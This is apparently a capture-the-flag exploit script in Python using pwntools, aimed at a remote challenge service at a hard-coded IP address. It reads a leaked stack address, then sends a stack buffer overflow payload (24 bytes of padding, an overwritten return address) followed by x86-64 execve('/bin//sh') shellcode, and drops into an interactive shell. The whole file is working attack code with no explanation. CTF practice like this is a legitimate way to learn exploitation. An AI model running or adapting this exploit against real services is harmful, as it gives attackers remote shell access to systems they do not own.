#!/usr/bin/env python

from pwn import *

#p = process("./shellcode")        #offset 24
p = remote("118.89.138.44",30003)
context.log_level="debug"
p.recvline()
addr_data = p.recvline()
addr = int(addr_data.split("[")[1].split("]")[0][2:], 16)
p.recvline()

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload = "A"*24 + p64(addr + 24 + 8) + shellcode

p.send(payload)

p.interactive()
